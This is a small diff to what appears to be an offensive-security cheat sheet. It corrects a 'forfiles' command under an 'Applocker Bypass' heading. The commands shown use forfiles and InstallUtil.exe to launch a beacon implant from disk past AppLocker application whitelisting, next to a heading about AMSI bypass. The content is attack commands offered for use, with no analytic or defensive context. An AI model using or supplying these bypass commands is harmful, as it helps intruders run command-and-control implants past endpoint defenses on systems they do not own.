@@ -49,7 +49,7 @@ Powershell Encoding (AMSI Bypass)
   
 Applocker Bypass
   Put Beacon on disk and run the following
-  forfile /p C:\Windows\System32 /m calc.exe /c 'path_to_beacon.exe'
+  forfiles /p C:\Windows\System32 /m calc.exe /c 'path_to_beacon.exe'
   	example: forfile /p C:\Windows\System32 /m ping.exe /c 'c:\windows\temp\beacon.exe'
   InstallUtil.exe /logfile= /LogToConsole=false /U file.dll or file.exe
   
